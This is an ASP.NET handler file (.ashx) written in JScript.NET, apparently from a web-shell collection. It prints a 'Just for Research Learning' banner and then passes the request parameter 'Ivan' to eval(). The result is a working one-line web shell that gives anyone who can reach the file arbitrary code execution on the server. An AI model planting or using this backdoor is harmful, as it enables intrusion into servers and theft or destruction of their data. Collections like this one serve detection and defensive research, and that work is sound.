<%@ WebHandler Language="JScript" class="AsyncHandlerSpy"%>import System;import System.Web;import System.IO;public class AsyncHandlerSpy implements IHttpAsyncHandler{function IHttpAsyncHandler.BeginProcessRequest(context : HttpContext,asyncCallback :AsyncCallback , obj : Object ) : IAsyncResult {context.Response.Write("<H1>Just for Research Learning, Do Not Abuse It! Written By <a href='https://github.com/Ivan1ee'>Ivan1ee</a></H1>");eval(context.Request["Ivan"]);HttpContext.Current.Response.End();}function IHttpAsyncHandler.EndProcessRequest(result : IAsyncResult){}function IHttpHandler.ProcessRequest(context : HttpContext){}function get IHttpHandler.IsReusable() : Boolean{return false;}}

    
   


